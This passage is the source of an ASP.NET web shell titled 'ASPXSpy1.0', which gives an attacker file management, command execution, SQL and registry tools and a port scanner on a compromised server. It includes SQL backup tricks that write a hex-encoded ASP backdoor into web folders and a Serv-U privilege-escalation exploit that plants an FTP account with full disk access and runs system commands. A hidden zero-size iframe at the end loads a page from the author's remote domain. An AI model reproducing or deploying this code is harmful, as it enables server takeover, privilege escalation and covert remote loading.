            foreach (DataRow dr in databind.Rows)
            {
                for (int i = 0; i < databind.Columns.Count; i++)
                {
                    res += dr[i] + "\r";
                }
            }
            Bin_ResLabel.Text = "<hr><div id=\"nei\"><PRE>" + res.Replace(" ", "&nbsp;").Replace("<", "&lt;").Replace(">", "&gt;") + "</PRE></div>";
            
            
        }
        catch (Exception error)
        {
            Bin_Error(error.Message);
        }

    }

    protected void Bin_DirButton_Click(object sender, EventArgs e)
    {
        Bin_dirPanel.Visible = true;
        Bin_AccPanel.Visible = false;
        Bin_DBinfoLabel.Visible = false;
        Bin_DataGrid.Visible = false;
        Bin_Scroll.Visible = false; 
    }
    
    protected void Bin_listButton_Click(object sender, EventArgs e)
    {
        Bin_dirPanel.Visible = true;
        Bin_AccPanel.Visible = false;
        Bin_DBinfoLabel.Visible = false;
        Bin_SqlDir();
    }
    public void Bin_SqlDir() 
    {
        try
        {
            Bin_DataGrid.Visible = true;
            Bin_Scroll.Visible = true;
            Bin_DataGrid.AllowPaging = false;
            string exesql = "use pubs;if exists (select * from sysobjects where id = object_id(N'[bin_dir]') and OBJECTPROPERTY(id, N'IsUserTable') = 1) drop table [bin_dir]; CREATE TABLE bin_dir(DirName VARCHAR(400), DirAtt VARCHAR(400),DirFile VARCHAR(400)) INSERT bin_dir EXEC MASTER..XP_dirtree '" + Bin_DirTextBox.Text + "',1,1;";
            Bin_ExecSql(exesql);
            DataTable sql_dir = Bin_DataTable("select * from bin_dir");
            Bin_DataGrid.DataSource = sql_dir;
            Bin_DataGrid.DataBind();
        }
        catch (Exception e)
        {
            Bin_Error(e.Message);
        }
    }

    protected void Bin_SuButton_Click(object sender, EventArgs e)
    {
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = true;
        Bin_IISPanel.Visible = false;
        Bin_SuresLabel.Text = "";
        Bin_LoginPanel.Visible = false;
        Bin_RegPanel.Visible = false;
        Bin_PortPanel.Visible = false;
    }

    protected void Bin_dbshellButton_Click(object sender, EventArgs e)
    {
        Bin_DBinfoLabel.Visible = false;
        Bin_AccPanel.Visible = false;
        Bin_BakDB();
    }
    public void Bin_BakDB() 
    {
        string path = Bin_DirTextBox.Text.Trim();
        if (path.Substring(path.Length - 1, 1) == @"\")
        {
            path = path + "bin.asp";
        }
        else 
        {
            path = path + @"\bin.asp";
        }
        string sql = "if exists (select * from sysobjects where id = object_id(N'[bin_cmd]') and OBJECTPROPERTY(id, N'IsUserTable') = 1) drop table [bin_cmd];create table [bin_cmd] ([cmd] [image]);declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x62696E backup database @a to disk = @s;insert into [bin_cmd](cmd) values(0x3C256578656375746520726571756573742822422229253E);declare @b sysname,@t nvarchar(4000) select @b=db_name(),@t='" + path + "' backup database @b to disk = @t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];";
        Bin_ExecSql(sql);
        Bin_SqlDir();  
    }
    public void Bin_BakLog()
    {
        string path = Bin_DirTextBox.Text.Trim();
        if (path.Substring(path.Length - 1, 1) == @"\")
        {
            path = path + "bin.asp";
        }
        else
        {
            path = path + @"\bin.asp";
        }
        string sql = "if exists (select * from sysobjects where id = object_id(N'[bin_cmd]') and OBJECTPROPERTY(id, N'IsUserTable') = 1) drop table [bin_cmd];create table [bin_cmd] ([cmd] [image]);declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x62696E backup log @a to disk = @s;insert into [bin_cmd](cmd) values(0x3C256578656375746520726571756573742822422229253E);declare @b sysname,@t nvarchar(4000) select @b=db_name(),@t='" + path + "' backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];";
        Bin_ExecSql(sql);
        Bin_SqlDir();
    }

    protected void Bin_LogshellButton_Click(object sender, EventArgs e)
    {
        Bin_DBinfoLabel.Visible = false;
        Bin_AccPanel.Visible = false;
        Bin_BakLog();
    }

    protected void Bin_SuexpButton_Click(object sender, EventArgs e)
    {
        string Result = "";
        string user = Bin_SunameTextBox.Text;
        string pass = Bin_SupassTextBox.Text;
        int port = Int32.Parse(Bin_SuportTextBox.Text);
        string cmd = Bin_SucmdTextBox.Text;
        string loginuser = "user " + user + "\r\n";
        string loginpass = "pass " + pass + "\r\n";
        string site = "SITE MAINTENANCE\r\n";
        string deldomain = "-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
        string setdomain = "-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
        string newdomain = "-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
        string quite = "QUIT\r\n";
        try
        {
            TcpClient tcp = new TcpClient("127.0.0.1", port);
            tcp.ReceiveBufferSize = 1024;
            NetworkStream NS = tcp.GetStream();
            Result = Rev(NS);
            Result += Send(NS, loginuser);
            Result += Rev(NS);
            Result += Send(NS, loginpass);
            Result += Rev(NS);
            Result += Send(NS, site);
            Result += Rev(NS);
            Result += Send(NS, deldomain);
            Result += Rev(NS);
            Result += Send(NS, setdomain);
            Result += Rev(NS);
            Result += Send(NS, newdomain);
            Result += Rev(NS);
            TcpClient tcp1 = new TcpClient("127.0.0.1", 52521);
            NetworkStream NS1 = tcp1.GetStream();
            Result += Rev(NS1);
            Result += Send(NS1, "user bin\r\n");
            Result += Rev(NS1);
            Result += Send(NS1, "pass binftp\r\n");
            Result += Rev(NS1);
            Result += Send(NS1, "site exec " + cmd + "\r\n");
            Result += Rev(NS1);
            tcp1.Close();
            Result += Send(NS, deldomain);
            Result += Rev(NS);
            Result += Send(NS, quite);
            Result += Rev(NS);
            tcp.Close();
        }
        catch (Exception error)
        {
            Bin_Error(error.Message);
        }
        Bin_SuresLabel.Text = "<div id=\"su\"><pre>" + Result + "</pre></div>";
        
        
    }
    protected string Rev(NetworkStream instream) 
    {
        string Restr = "";
        if (instream.CanRead) 
        {
            byte[] buffer = new byte[1024];
            instream.Read(buffer, 0, buffer.Length);
            Restr = Encoding.ASCII.GetString(buffer); 
        }
        return "<font color = red>" + Restr + "</font><br>";
        
    }
    protected string Send(NetworkStream instream,string Sendstr) 
    {
        if (instream.CanWrite) 
        {
            byte[] buffer = Encoding.ASCII.GetBytes(Sendstr);
            instream.Write(buffer, 0, buffer.Length);
        }
        return "<font color = blue>" + Sendstr + "</font><br>";
    }
    protected void Bin_IISButton_Click(object sender, EventArgs e)
    {
        Bin_LoginPanel.Visible = false;
        Bin_MainPanel.Visible = false;
        Bin_MenuPanel.Visible = true;
        Bin_FilePanel.Visible = false;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = true;
        Bin_RegPanel.Visible = false;
        Bin_PortPanel.Visible = false;
        Bin_iisLabel.Text = Bin_iisinfo();

    }

    protected void Bin_PortButton_Click(object sender, EventArgs e)
    {
        Bin_MenuPanel.Visible = true;
        Bin_LoginPanel.Visible = false;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        Bin_RegPanel.Visible = false;
        Bin_PortPanel.Visible = true;
        Bin_ScanresLabel.Text = "";
    }

    protected void Bin_RegButton_Click(object sender, EventArgs e)
    {
        Bin_MenuPanel.Visible = true;
        Bin_LoginPanel.Visible = false;
        Bin_CmdPanel.Visible = false;
        Bin_SQLPanel.Visible = false;
        Bin_SuPanel.Visible = false;
        Bin_IISPanel.Visible = false;
        Bin_RegPanel.Visible = true;
        Bin_PortPanel.Visible = false;
        Bin_RegresLabel.Text = "";
        
    }

    protected void Bin_RegreadButton_Click(object sender, EventArgs e)
    {
        try
        {
            string regkey = Bin_KeyTextBox.Text;
            string subkey = regkey.Substring(regkey.IndexOf("\\") + 1, regkey.Length - regkey.IndexOf("\\") - 1);
            RegistryKey rk = null;
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_LOCAL_MACHINE")
            {
                rk = Registry.LocalMachine.OpenSubKey(subkey);
            }
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_CLASSES_ROOT")
            {
                rk = Registry.ClassesRoot.OpenSubKey(subkey);
            }
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_CURRENT_USER")
            {
                rk = Registry.CurrentUser.OpenSubKey(subkey);
            }
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_USERS")
            {
                rk = Registry.Users.OpenSubKey(subkey);
            }
            if (regkey.Substring(0, regkey.IndexOf("\\")) == "HKEY_CURRENT_CONFIG")
            {
                rk = Registry.CurrentConfig.OpenSubKey(subkey);
            }

            Bin_RegresLabel.Text = "<br>Result : " + rk.GetValue(Bin_ValueTextBox.Text, "NULL").ToString();
        }
        catch (Exception error)
        {
            Bin_Error(error.Message); 
        }
    }

    protected void Bin_ScancmdButton_Click(object sender, EventArgs e)
    {
        try
        {
            string res = "";
            string[] port = Bin_PortsTextBox.Text.Split(',');
            for (int i = 0; i < port.Length; i++)
            {
                res += Bin_Scan(Bin_ScanipTextBox.Text, Int32.Parse(port[i])) + "<br>";
            }
            Bin_ScanresLabel.Text = "<hr>" + res;
        }
        catch (Exception error)
        {
            Bin_Error(error.Message); 
        }  
    }
    protected string Bin_Scan(string ip, int port) 
    {
        
        string scanres = "";
        TcpClient tcp = new TcpClient();
        tcp.SendTimeout = tcp.ReceiveTimeout = 2000;
        try
        {
            tcp.Connect(ip, port);
            tcp.Close();
            scanres = ip + " : " + port + " ................................. <font color=green><b>Open</b></font>";
        }
        catch (SocketException e) 
        {
            scanres = ip + " : " + port + " ................................. <font color=red><b>Close</b></font>";
        }  
        return scanres;
    }
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>ASPXSpy1.0 -> Bin:)</title>
<style type="text/css">
    A:link {
      COLOR:#000000; TEXT-DECORATION:None
}
A:visited {
       COLOR:#000000; TEXT-DECORATION:None
}
A:active {
       COLOR:#000000; TEXT-DECORATION:None
}
A:hover {
       COLOR:#000000; TEXT-DECORATION:underline
}
BODY {
	FONT-SIZE: 9pt;
	FONT-FAMILY: "Courier New";
	}
#nei {
	width:500px;
	margin:0px auto;
	
	overflow:hidden
}
#su {
	width:300px;
	margin:0px auto;
	
	overflow:hidden
}
#cmd {
	width:500px;
	margin:0px auto;
	
	overflow:hidden
}
    </style>
    <script type="text/javascript" language="javascript" >
    function Command(cmd, str)
    {
      var strTmp = str;
      var frm = document.forms[0];
      if(cmd == 'del')
      {
		if(confirm('Del It ?'))
		{
			frm.todo.value = str;
			frm.goaction.value = cmd;
			frm.submit();
		}
		else return;
	  }
	  if (cmd == 'change')
	  {
	     frm.todo.value = str;  
         frm.goaction.value = cmd;
	     frm.submit();
	  }
	  if (cmd == 'down')
	  {
	     frm.todo.value = str;
         frm.goaction.value = cmd;
	     frm.submit();
	  }
	  if (cmd == 'showatt')
	  {
	     frm.todo.value = str;
         frm.goaction.value = cmd;
	     frm.submit();
	  }
	  if (cmd == 'edit')
	  {
	     frm.todo.value = str;
         frm.goaction.value = cmd;
	     frm.submit();
	  }
	  if (cmd == 'deldir')
	  {
	  if(confirm('Del It ?'))
		{
	     frm.todo.value = str;
         frm.goaction.value = cmd;
	     frm.submit();
	    }
	    else return;
	  }
	  if(cmd == 'rename' )
	  {
		frm.goaction.value = cmd;
		frm.todo.value = str + ',';
		str = prompt('Please input new filename:', strTmp);
		if(str && (strTmp != str))
		{
			frm.todo.value += str;
			frm.submit();
	    }
		else return;
	   }
	   if(cmd == 'renamedir' )
	  {
		frm.goaction.value = cmd;
		frm.todo.value = str + ',';
		str = prompt('Please input new foldername:', strTmp);
		if(str && (strTmp != str))
		{
			frm.todo.value += str;
			frm.submit();
	    }
		else return;
	   }
	   if (cmd == 'postdata')
	  {
	     frm.todo.value = str.value;
         frm.goaction.value = cmd;
	     frm.submit();
	  }
	  if (cmd == 'changedata')
	  {
	     frm.todo.value = str.value;
	     frm.intext.value = str.options[str.selectedIndex].innerText
         frm.goaction.value = cmd;
	     frm.submit();
	  }
   }
   
    </script>
</head>
<body>
    <form id="form1" runat="server"><div style="text-align: center"><asp:Panel ID="Bin_LoginPanel" runat="server" Height="47px" Width="401px">
            <asp:Label ID="PassLabel" runat="server" Text="Password:"></asp:Label>
            <asp:TextBox ID="passtext" runat="server" TextMode="Password" Width="203px"></asp:TextBox>
            <asp:Button ID="LoginButton" runat="server" Text="进入" OnClick="LoginButton_Click" /><p />
            Copyright (C) 2009 Bin -> <a href="http://www.7jyewu.cn" target="_blank">www.7jyewu.cn</a></asp:Panel><asp:Panel ID="Bin_MenuPanel" runat="server" Height="56px" Width="771px">
            <asp:Label ID="TimeLabel" runat="server" Text="Label" Width="150px"></asp:Label><br />
            <asp:Button ID="MainButton" runat="server" OnClick="MainButton_Click" Text="Sysinfo" />
                <asp:Button ID="Bin_IISButton" runat="server" OnClick="Bin_IISButton_Click" Text="IISSpy" />
            <asp:Button ID="FileButton" runat="server" OnClick="FileButton_Click" Text="WebShell" />
                <asp:Button ID="Bin_CmdButton" runat="server" Text="Command" OnClick="Bin_CmdButton_Click" />
                <asp:Button ID="Bin_SQLButton" runat="server" OnClick="Bin_SQLButton_Click" Text="SqlTools" />&nbsp;<asp:Button
                    ID="Bin_SuButton" runat="server" OnClick="Bin_SuButton_Click" Text="SuExp" />
                <asp:Button ID="Bin_PortButton" runat="server" Text="PortScan" OnClick="Bin_PortButton_Click" />
                <asp:Button ID="Bin_RegButton" runat="server" Text="RegShell" OnClick="Bin_RegButton_Click" />
            <asp:Button ID="LogoutButton" runat="server" OnClick="LogoutButton_Click" Text="Logout" /><br />
            <asp:Label ID="Bin_ErrorLabel" runat="server" EnableViewState="False">Copyright (C) 2009 Bin -> <a href="http://www.7jyewu.cn" target="_blank">www.7jyewu.cn</a> -> <a href="http://www.rootkit.net.cn/index.aspx" target="_blank">Reverse-IP</a> </asp:Label></asp:Panel>
        <asp:Panel ID="Bin_MainPanel" runat="server" Width="769px" EnableViewState="False" Visible="False" Height="20px">
            <div style="text-align: left"><asp:Label ID="InfoLabel" runat="server" Width="765px" EnableViewState="False"  ></asp:Label></div></asp:Panel><div style="text-align: center">
            <asp:Panel ID="Bin_FilePanel" runat="server" Width="767px" EnableViewState="False" Visible="False"><div style="text-align: left"><asp:Label ID="Bin_FileLabel" runat="server" Text="Label" Width="764px"></asp:Label><br />
            <asp:Label ID="Bin_UpfileLabel" runat="server" Text="Upfile :  "></asp:Label>
            <input class="TextBox" id="Bin_UpFile" type="file" name="upfile" runat="server" />&nbsp;<asp:TextBox ID="Bin_upTextBox" runat="server" Width="339px"></asp:TextBox>&nbsp;
                <asp:Button ID="Bin_GoButton" runat="server" OnClick="Bin_GoButton_Click" Text="GO" />
            <asp:Button ID="Bin_upButton" runat="server" Text="UpLoad" OnClick="Bin_upButton_Click" EnableViewState="False" /><br />
            <asp:Label ID="Bin_CreateLabel" runat="server" Text="Create :"></asp:Label>
            <asp:TextBox ID="Bin_CreateTextBox" runat="server"></asp:TextBox><asp:Button ID="Bin_NewFileButton"
                runat="server" Text="NewFile" OnClick="Bin_NewFileButton_Click" />
            <asp:Button ID="Bin_NewdirButton" runat="server" Text="NewDir" OnClick="Bin_NewdirButton_Click" />
            <br />
            <asp:Label ID="Bin_CopyLabel" runat="server" Text="Copy :" Width="39px"></asp:Label>
            &nbsp;
            <asp:TextBox ID="Bin_CopyTextBox" runat="server" Width="273px"></asp:TextBox>
            <asp:Label ID="Bin_CopytoLable" runat="server" Text="To:"></asp:Label>
            <asp:TextBox ID="Bin_CopytoTextBox" runat="server" Width="268px"></asp:TextBox>
            <asp:Button ID="Bin_CopyButton" runat="server" Text="Copy" OnClick="Bin_CopyButton_Click" />
            <asp:Button ID="Bin_CutButton" runat="server" Text="Cut" Width="46px" OnClick="Bin_CutButton_Click" />
                <asp:Label ID="Bin_FilelistLabel" runat="server" EnableViewState="False"></asp:Label></div><div style="text-align: center">
                <asp:Panel ID="Bin_AttPanel" runat="server" Width="765px" Visible="False"><hr />
                    FileName :
                    <asp:Label ID="Bin_AttLabel" runat="server" Text="Label"></asp:Label><br />
                    <asp:CheckBox ID="Bin_ReadOnlyCheckBox" runat="server" Text="ReadOnly" />
                    <asp:CheckBox ID="Bin_SystemCheckBox" runat="server" Text="System" />
                    <asp:CheckBox ID="Bin_HiddenCheckBox" runat="server" Text="Hidden" />
                    <asp:CheckBox ID="Bin_ArchiveCheckBox" runat="server" Text="Archive" />
                    <br />
                    CreationTime :
                    <asp:TextBox ID="Bin_CreationTimeTextBox" runat="server" Width="123px"></asp:TextBox>
                    LastWriteTime :
                    <asp:TextBox ID="Bin_LastWriteTimeTextBox" runat="server" Width="129px"></asp:TextBox>
                    LastAccessTime :
                    <asp:TextBox ID="Bin_AccessTimeTextBox" runat="server" Width="119px"></asp:TextBox><br />
                    <asp:Button ID="Bin_SetButton" runat="server" OnClick="Bin_SetButton_Click" Text="Set" />
                    <asp:Button ID="Bin_SbackButton" runat="server" OnClick="Bin_SbackButton_Click" Text="Back" />
                    <hr />
                </asp:Panel></div>
                <div style="text-align: center"><asp:Panel ID="Bin_EditPanel" runat="server" Visible="False"><hr style="width: 757px" />
                    Path:<asp:TextBox ID="Bin_EditpathTextBox" runat="server" Width="455px"></asp:TextBox><br />
                    <asp:TextBox ID="Bin_EditTextBox" runat="server" TextMode="MultiLine" Columns="100" Rows="25" Width="760px"></asp:TextBox><br />
                    <asp:Button ID="Bin_EditButton" runat="server" Text="Sumbit" OnClick="Bin_EditButton_Click" />&nbsp;<asp:Button
                        ID="Bin_BackButton" runat="server" OnClick="Bin_BackButton_Click" Text="Back" /></asp:Panel></div></asp:Panel></div>
                <asp:Panel ID="Bin_CmdPanel" runat="server" Height="50px" Width="763px"><hr />
                    CmdPath : &nbsp;<asp:TextBox ID="Bin_CmdPathTextBox" runat="server" Width="395px">C:\Windows\System32\Cmd.exe</asp:TextBox><br />
                    Argument :
                    <asp:TextBox ID="Bin_CmdShellTextBox" runat="server" Width="395px">/c Set</asp:TextBox><br />
                    <asp:Button ID="Bin_RunButton" runat="server" OnClick="Bin_RunButton_Click" Text="Run" />
                    <div style="text-align: left">
                    <asp:Label ID="Bin_CmdLabel" runat="server" EnableViewState="False"></asp:Label></div>
                    <hr /></asp:Panel>
        <asp:Panel ID="Bin_SQLPanel" runat="server" Visible="False" Width="763px">
            <hr />
            ConnString :
            <asp:TextBox ID="Bin_SQLconnTextBox" runat="server" Width="547px">server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB</asp:TextBox><br />
            <asp:RadioButton ID="Bin_SQLRadioButton" runat="server" AutoPostBack="True" OnCheckedChanged="Bin_SQLRadioButton_CheckedChanged" Text="MS-SQL" Checked="True" />
            <asp:RadioButton ID="Bin_AccRadioButton" runat="server" AutoPostBack="True" OnCheckedChanged="Bin_AccRadioButton_CheckedChanged" Text="MS-Access" />
            <asp:Button ID="SQL_SumbitButton" runat="server" Text="Sumbit" OnClick="SQL_SumbitButton_Click" /><hr />
            <asp:Panel ID="Bin_DBmenuPanel" runat="server" Width="759px" Visible="False">
                <asp:Button ID="Bin_BDButton" runat="server" Text="DataBase" OnClick="Bin_BDButton_Click" />
                <asp:Button ID="Bin_SACMDButton" runat="server" Text="SA_Exec" OnClick="Bin_SACMDButton_Click" />
                <asp:Button ID="Bin_DirButton" runat="server" Text="SQL_Dir" OnClick="Bin_DirButton_Click" /><br /><hr /><div style="text-align: left">
                <asp:Label ID="Bin_DBinfoLabel" runat="server" Text="Label" EnableViewState="False"></asp:Label></div></asp:Panel>
            <asp:Panel ID="Bin_AccPanel" runat="server" Height="50px" Width="759px" EnableViewState="False">
               <asp:Label ID="Bin_AccinfoLabel" runat="server" Text="Label" EnableViewState="False"></asp:Label><br />
            <asp:TextBox ID="Bin_DBstrTextBox" runat="server" TextMode="MultiLine" Width="569px"></asp:TextBox>
            <asp:Button ID="Bin_ExecButton" runat="server" OnClick="Bin_ExecButton_Click" Text="Exec" />
                <asp:Button ID="Bin_SAexecButton" runat="server" Text="SA_Exec" OnClick="Bin_SAexecButton_Click" /><br />
                <div style="text-align:left">
                <asp:Label ID="Bin_ResLabel" runat="server" ></asp:Label></div></asp:Panel>
            <asp:Panel ID="Bin_dirPanel" runat="server" Visible="False" Width="759px">
                Path :
                <asp:TextBox ID="Bin_DirTextBox" runat="server" Width="447px">c:\</asp:TextBox>
                <br />
                <asp:Button ID="Bin_listButton" runat="server" OnClick="Bin_listButton_Click" Text="Dir" />&nbsp;<asp:Button
                    ID="Bin_dbshellButton" runat="server" OnClick="Bin_dbshellButton_Click" Text="Bak_DB" />
                <asp:Button ID="Bin_LogshellButton" runat="server" Text="Bak_LOG" OnClick="Bin_LogshellButton_Click" /><hr /></asp:Panel>
            <br /><br />
            <div style="overflow:scroll; text-align:left; width:770px;" id="Bin_Scroll" runat="server" visible="false" >
         <asp:DataGrid ID="Bin_DataGrid" runat="server" Width="753px" PageSize="20" CssClass="Bin_DataGrid" OnItemDataBound="Item_DataBound" AllowPaging="True" OnPageIndexChanged="Bin_DBPage" OnItemCommand="Item_Command">
             <PagerStyle Mode="NumericPages" Position="TopAndBottom" />
</asp:DataGrid></div>
        </asp:Panel>
        <asp:Panel ID="Bin_SuPanel" runat="server" Width="763px" >
            <hr />
            Name :
            <asp:TextBox ID="Bin_SunameTextBox" runat="server">localadministrator</asp:TextBox>
            Pass :
            <asp:TextBox ID="Bin_SupassTextBox" runat="server">#l@$ak#.lk;0@P</asp:TextBox>
            Port :
            <asp:TextBox ID="Bin_SuportTextBox" runat="server">43958</asp:TextBox><br />
            CMD :
            <asp:TextBox ID="Bin_SucmdTextBox" runat="server" Width="447px">cmd.exe /c net user</asp:TextBox><br />
            <asp:Button ID="Bin_SuexpButton" runat="server" Text="Exploit" OnClick="Bin_SuexpButton_Click" /><br />
            <div style="text-align:left">
            <hr />
            <asp:Label ID="Bin_SuresLabel" runat="server"></asp:Label>
            </div>
            </asp:Panel>
        <asp:Panel ID="Bin_IISPanel" runat="server" Width="763px"><div style="text-align:left">
            <hr />
            <asp:Label ID="Bin_iisLabel" runat="server" Text="Label" EnableViewState="False"></asp:Label>&nbsp;</div></asp:Panel>
        <asp:Panel ID="Bin_RegPanel" runat="server" Width="763px"><hr /><div style="text-align:left">
            KEY :&nbsp; &nbsp;<asp:TextBox ID="Bin_KeyTextBox" runat="server" Width="595px">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName</asp:TextBox><br />
            VALUE :
            <asp:TextBox ID="Bin_ValueTextBox" runat="server" Width="312px">ComputerName</asp:TextBox>&nbsp;<asp:Button
                ID="Bin_RegreadButton" runat="server" Text="Read" OnClick="Bin_RegreadButton_Click" /><br />
            <asp:Label ID="Bin_RegresLabel" runat="server"></asp:Label><hr /></div></asp:Panel>
        <asp:Panel ID="Bin_PortPanel" runat="server" Width="763px">
            <hr /><div style="text-align:left">
                IP :
                <asp:TextBox ID="Bin_ScanipTextBox" runat="server" Width="194px">127.0.0.1</asp:TextBox>
                PORT :
            <asp:TextBox ID="Bin_PortsTextBox" runat="server" Width="356px">21,80,1433,3306,3389,4899,5631,43958,65500</asp:TextBox>
                <asp:Button ID="Bin_ScancmdButton" runat="server" Text="Scan" OnClick="Bin_ScancmdButton_Click" /><br />
                <asp:Label ID="Bin_ScanresLabel" runat="server"></asp:Label></div><hr /></asp:Panel>
        
    </div></form>
</body>
<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>
</html>
